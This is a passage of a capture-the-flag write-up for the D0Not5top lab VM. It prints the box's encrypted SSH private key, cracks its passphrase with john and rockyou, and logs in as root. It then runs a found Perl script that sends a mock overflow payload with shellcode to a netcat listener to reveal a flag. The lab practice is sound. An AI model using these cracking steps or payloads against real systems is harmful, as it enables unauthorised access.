Then we proceed to crack the password and login via ssh

```bash
root@kali:~# nano id_rsa
root@kali:~# nano id_rsa.pub
root@kali:~# cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,7DA162212961C0CF94C636B47C991024

rDnUjh68EoasdaP40ta9QBeXtvB5uUVH9nKHKWo4KvhLcM4Z0/R6qvjSjlHir4LR
uhTb5Y+e2C7Wze8GlYbdGksFXbUztZec26vN7xH8Q4SeI++J77agqKWRE6jJ++hd
DsR7vDcqGbm9xX37BbE9Q4lLEHR/hNRe3/Ztrbt3obnCLvCW6H3kzpteycWAQQ3W
BaFns85p4AZn654HoIqX/UOkztdYxgOLgpzrLh9p1bRLiaOiBCrURkpYLspeKCNN
yfuPvNUgF1+uH78GlvLwfAA6XRj6HPDZ3D22/MxKcGixUVSPXjJlRpqyFQtvSM6T
cN5NmXjOjmzfgafqPqf7eTFfLChcsWHUmsSneq7pQhvw/vfeGX2kizuXCago+yWt
2IlFusQilfDDzybiunNOp+njD7TxeBLFcAUVdACfMUQ/fC0GHKeHB8q79Wi7r0SQ
m0eC6fIXJpDavN9PtPF2v+5OH9EDKycaeWMmWT0S0fNMmIhHb+U/uhtDjQx+M9fI
I5aBCjzCsDCoKT0qkv+dTafyqSzUN9EupCRh0NcsUT00yrQkxzM5L6C3H+61SNq8
CNi4I50aDp8q6m0KP/GZhUAU9Uegj+JZQ1h5MSnjOpOvKbD4l6/rWM02iFVAmg4O
WjSQfqbxGCmoHE8Y7iqgB8lRWnDYPssDXIMx+1pBkNkBASMpz6gJBZ//rJE1PkVr
aKdhbJFR1NX097z3HXS/7SBJmyuctG+JviH7mp1fH3WMAk2iu4nSiE1aNH1YV/nW
rXNOi5c7/yDE9o/weuJoCBL4VXeH89+l8551JOGU9RMuNk0pi/SSaUwwn7wR0/Yf
b9Sk3pbFDS64AON1T+4zlBWWif8aRMJ7Vm6zkDsE1Jq9nKcNzDknfufs45mKVzXU
m9dlGgzfNF46yPCuHzBZt4q1wrzg5/7gcWx5Qq6xD5VtWiMlB4G3D8DruaeqgTOi
Sh/jFqEOErA015Ympz/0Hh/lFn0NAAJy89BPG86d+VVAn5YstQEqH6zzuIy9mZ9K
853+0BUxA0I9rEessa+Q+NlFadBVE2FcJAr7rMsLGZFoqfvWxg5hBJFJ7jrjpQNe
Q9qzA/CbiMeU+zdifXZwprJR1fNVWalPJJGwotwVgXN/z4s8iN1gMN9y4Kynue9k
zQ/HqvgTkyX52ojLnM/PkXCyx7EXBAOJi5s6fv/22kcZ5Xkpw+x/VILPnJqObmU9
RZ3IB6kbckiMld5GX+xMvYi9rvmHf/mdLj75e7PU+FjCufApXAi+T10PnvMvrCGS
FkSlVyPPo1s4klTdrf2l6tkK6Lqu/7SamkvQvMsY7wnNT4OPI95y3GoRnwEFLd7w
honOroF1U6leA5O8jxSxI/CIwxvb5DO/sX4bZxShlhD98yO74ImAg5ACTj/eUaVA
/Q7bpfasSnqdKNWhx81pD6Ee9WeBZv8c0I0/EqS188O1qFYbtsaqZhYytTqYwvZ0
p6QuusMnDaA1nB8wL7ltKXt5PhBBxSVbUKtP6DWcBRviItFTsAnmK1QhD2wmTkCu
B8ochgwCgtAUs4cUXxnZrp5pu2yvu8Dhf//z8lBtoItPh5LTmW1N1g4s+9NKt72P
-----END RSA PRIVATE KEY-----

root@kali:~# cat id_rsa.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPKVt8KEVrr80LT9ZwRsWG8w9O2vgWd99+2+xmi3WCgCR/IrhqoJqEhX9owwiaUUnyRWrj9AKDj8Neetju9rOCTJsvWAlfFgyrRXkOV9twpLcrML+LC5GsVGLH7U/R2sTpT9Ywad0yL+FTvHZ+AbYLFpml4Gbhat6Ynhcg3Q6XmxGHXkV9cd6/XCx74K8CKEtOye1REj8KDtsC329qvbp/9Dt1ZZQEAUFvLqgLJiZxmH5snWiszcO2TKQ3lUw3tLy5rA/bXe3Bf4zuEmktEuA0NW+FTLYELrBy/5PK007Uh0CQVpVS5C+tkLtqh6meAXPp7dhi/B6qGOIXpPxjpUjH root@D0Not5top
root@kali:~# ssh2john id_rsa > passphrase
root@kali:~# john --wordlist=/usr/share/wordlists/rockyou.txt passphrase 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA 32/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
gustateamo       (id_rsa)
1g 0:00:00:13 DONE (2017-04-28 09:42) 0.07220g/s 559256p/s 559256c/s 559256C/s gustateamo
Use the "--show" option to display all of the cracked passwords reliably
Session completed
root@kali:~# 
root@kali:~# chmod 700 id_rsa
root@kali:~# ssh -i id_rsa root@192.168.1.167
Enter passphrase for key 'id_rsa':
The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.

root@D0Not5top:~#
root@D0Not5top:~# id
uid=0(root) gid=0(root) groups=0(root)
root@D0Not5top:~# 
```

we find the last files

```bash

#!/usr/bin/perl -w
######################################################
#                                                    #
#  W311 D0n3                                         #
#  Y0u D1d N0t5top                                   #
#  Much0 M3Gu5t4 :D                                  #
#                                                    #
#  3mrgnc3                                           #
#                                                    #
#  Hope you had fun...                               #
#  8ut...                                            #
#                                                    #
#  p.s..                                             #
#  571ll 1 M0r3 f146 :D                              #
#                                                    #
######################################################


use IO::Socket;

if(!($ARGV[1]))
{
 print "Usage: L45T_fl46.pl <user> <flag>\n\n";
 exit;
}

$shellcode =	"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f" .
                "\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x38" .
                "\x00\x00\x00\x59\x41\x59\x20\x46\x4c\x34\x36\x5f\x37" .
                "\x3a\x39\x74\x6a\x74\x38\x36\x65\x76\x76\x63\x79\x77" .
                "\x75\x75\x66\x37\x37\x34\x68\x72\x38\x38\x65\x75\x69" .
                "\x33\x6e\x75\x73\x38\x64\x6c\x6b\x20\x32\x3e\x2f\x74" .
                "\x6d\x70\x2f\x68\x75\x68\x00\x57\x53\x89\xe1\xcd\x80" .
                "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f" .
                "\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x38" .
                "\x00\x00\x00\x59\x41\x59\x20\x46\x4c\x34\x36\x5f\x37" .
                "\x3a\x39\x74\x6a\x74\x38\x36\x65\x76\x76\x63\x79\x77" .
                "\x75\x75\x66\x37\x37\x34\x68\x72\x38\x38\x65\x75\x69" .
                "\x33\x6e\x75\x73\x38\x64\x6c\x6b\x20\x32\x3e\x2f\x74" .
                "\x6d\x70\x2f\x68\x75\x68\x00\x57\x53\x89\xe1\xcd\x80" .
                "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f" .
                "\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x38" .
                "\x00\x00\x00\x59\x41\x59\x20\x46\x4c\x34\x36\x5f\x37" .
                "\x3a\x39\x74\x6a\x74\x38\x36\x65\x76\x76\x63\x79\x77" .
                "\x75\x75\x66\x37\x37\x34\x68\x72\x38\x38\x65\x75\x69" .
                "\x33\x6e\x75\x73\x38\x64\x6c\x6b\x20\x32\x3e\x2f\x74" .
                "\x6d\x70\x2f\x68\x75\x68\x00\x57\x53\x89\xe1\xcd\x80" .
                "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f" .
                "\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x38" .
                "\x00\x00\x00\x59\x41\x59\x20\x46\x4c\x34\x36\x5f\x37" .
                "\x3a\x39\x74\x6a\x74\x38\x36\x65\x76\x76\x63\x79\x77" .
                "\x75\x75\x66\x37\x37\x34\x68\x72\x38\x38\x65\x75\x69" .
                "\x33\x6e\x75\x73\x38\x64\x6c\x6b\x20\x32\x3e\x2f\x74" .
                "\x6d\x70\x2f\x68\x75\x68\x00\x57\x53\x89\xe1\xcd\x80" .
                "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f" .
                "\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x38" .
                "\x00\x00\x00\x59\x41\x59\x20\x46\x4c\x34\x36\x5f\x37" .
                "\x3a\x39\x74\x6a\x74\x38\x36\x65\x76\x76\x63\x79\x77" .
                "\x75\x75\x66\x37\x37\x34\x68\x72\x38\x38\x65\x75\x69" .
                "\x33\x6e\x75\x73\x38\x64\x6c\x6b\x20\x32\x3e\x2f\x74" .
                "\x6d\x70\x2f\x68\x75\x68\x00\x57\x53\x89\xe1\xcd\x80" .
                "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f" .
                "\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x2d" .
                "\x00\x00\x00\x4e\x33\x76\x33\x72\x20\x41\x73\x35\x75" .
                "\x6d\x33\x21\x20\x31\x74\x20\x4d\x34\x6b\x33\x35\x20" .
                "\x34\x6e\x20\x34\x35\x35\x20\x30\x66\x20\x79\x30\x75" .
                "\x20\x26\x20\x6d\x33\x20\x3a\x44\x00\x57\x53\x89\xe1" .
                "\xcd\x80" ;

$root = IO::Socket::INET->new(Proto=>'tcp',
                                PeerAddr=>$ARGV[0],
                                PeerPort=>$ARGV[1])
                            or die "Unable to use [$ARGV[0]] to open [$ARGV[1]]";
$ebp = "TROLLOOOLLO";
$eip = "\xBA\xDF\x00\xD0";
$flag7 = "RUN /" . "a"x1036 . $ebp . $eip . $shellcode . " HTTTPEE/1.1\n\n";

print $root $flag7;
sleep(5);
print "Done.\n";

close($root);
exit;



root@D0Not5top:~# 

root@D0Not5top:~#  ./L45T_fl46.pl 192.168.1.1 4321
-bash: ./L45T_fl46.pl: Permission denied
root@D0Not5top:~# chmod 755 L45T_fl46.pl 
root@D0Not5top:~#  ./L45T_fl46.pl 192.168.1.1 4321
Done.
root@D0Not5top:~# 
root@kali:~# nc -lp 4321 -vv
listening on [any] 4321 ...
connect to [192.168.1.1] from M36u574.ctf [192.168.1.167] 46611
RUN /aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaTROLLOOOLLO���j
 X�Rfh-c��h/shh/bin��R�8YAY FL46_7:9tjt86evvcywuuf774hr88eui3nus8dlk 2>/tmp/huhWS��̀j
                                                                                    X�Rfh-c��h/shh/bin��R�8YAY FL46_7:9tjt86evvcywuuf774hr88eui3nus8dlk 2>/tmp/huhWS��̀j
                                                                                                                                                                       X�Rfh-c��h/shh/bin��R�8YAY FL46_7:9tjt86evvcywuuf774hr88eui3nus8dlk 2>/tmp/huhWS��̀j
                                       X�Rfh-c��h/shh/bin��R�8YAY FL46_7:9tjt86evvcywuuf774hr88eui3nus8dlk 2>/tmp/huhWS��̀j
                                                                                                                          X�Rfh-c��h/shh/bin��R�8YAY FL46_7:9tjt86evvcywuuf774hr88eui3nus8dlk 2>/tmp/huhWS��̀j
                                                                                                                                                                                                             X�Rfh-c��h/shh/bin��R�-N3v3r As5um3! 1t M4k35 4n 455 0f y0u & m3 :DWS��̀ HTTTPEE/1.1

 sent 0, rcvd 1605
root@kali:~# 

```

and we notice the flag7

FL46_7:9tjt86evvcywuuf774hr88eui3nus8dlk
